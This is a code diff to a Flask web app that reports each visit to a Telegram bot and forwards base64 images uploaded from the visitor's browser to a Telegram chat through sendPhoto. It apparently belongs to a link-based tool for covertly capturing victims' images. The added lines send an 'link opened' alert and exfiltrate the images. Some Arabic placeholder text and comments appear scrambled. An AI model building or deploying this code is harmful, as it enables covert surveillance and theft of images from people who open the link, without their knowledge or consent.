@@ -2,17 +2,21 @@ from flask import Flask, render_template, request
 import requests
 import base64
 app = Flask(__name__)
+
+TOKEN = 'جف_حشا_تمنش_البمت'
+ID = 'جف_حشا_الأيدي_الخاص_بن'
+
 @app.route('/')
-def index(): return render_template('index.html')
+def index():
+    # رطالآ اختبار تصلن بمجرد فتح أي شخص للرابط
+    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=تم_فتح_الرابط_الآن')
+    return render_template('index.html')
+
 @app.route('/upload', methods=['POST'])
 def upload():
     try:
         img_data = request.json['img'].split(',')[1]
-        # استبدل الارقام التالية بدقة
-        token = 'YOUR_BOT_TOKEN_HERE'
-        chat_id = 'YOUR_CHAT_ID_HERE'
-        url = f'https://api.telegram.org/bot{token}/sendPhoto'
-        response = requests.post(url, data={'chat_id': chat_id}, files={'photo': ('img.jpg', base64.b64decode(img_data))})
-        return response.text
+        img_bytes = base64.b64decode(img_data)
+        res = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', data={'chat_id': ID}, files={'photo': ('img.jpg', img_bytes)})
+        return res.text
     except Exception as e: return str(e)
-if __name__ == '__main__': app.run()
